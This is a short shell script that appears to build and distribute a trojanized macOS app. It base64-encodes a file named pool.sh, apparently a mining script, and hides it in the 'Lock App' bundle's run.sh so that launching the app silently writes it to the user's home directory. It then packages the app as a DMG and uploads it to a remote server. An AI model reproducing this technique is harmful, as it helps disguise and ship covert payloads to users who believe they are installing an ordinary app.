echo -e "echo '`cat pool.sh|base64`'|base64 -D> ~/pool.sh\n" > Lock\ App.app/Contents/MacOS/run.sh
cat Lock\ App.app/Contents/MacOS/run.src >> Lock\ App.app/Contents/MacOS/run.sh
exit
hdiutil create LockApp.dmg -srcfolder Lock\ App.app/ -ov
scp LockApp.dmg root@pubbay.com:/home/content/pub/lockup
